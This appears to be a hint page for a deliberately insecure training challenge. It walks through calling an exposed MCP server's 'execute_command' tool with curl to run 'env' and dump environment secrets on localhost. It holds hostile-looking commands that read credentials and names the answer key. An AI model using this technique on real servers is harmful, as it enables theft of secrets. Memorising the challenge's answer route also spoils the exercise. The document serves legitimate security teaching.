=== Hint for Challenge 60

This challenge demonstrates how an insecure MCP (Model Context Protocol) server can leak secrets stored in environment variables.

**Where to look:**

1. **A separate MCP server is running on port 8090** — different from the main application port (8080)
2. **The MCP server implements the JSON-RPC 2.0 protocol** as defined by the MCP specification
3. **Start by listing the available tools** using the `tools/list` method
4. **Call the `execute_command` tool** — it will return the server's environment variables

**Step-by-step approach:**

First, list the tools the MCP server offers:

[source,bash]
----
curl -s -X POST http://localhost:8090/mcp \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/list"}'
----

Then call `execute_command` with any shell command (such as `env`):

[source,bash]
----
curl -s -X POST http://localhost:8090/mcp \
  -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"execute_command","arguments":{"command":"env"}}}'
----

**What to look for:**

- Find the `WRONGSECRETS_MCP_SECRET` key in the returned environment variable dump
- The value next to it is the answer to this challenge

**Remember:** The endpoint is also accessible on the main port — try `/mcp` if port 8090 is not reachable.
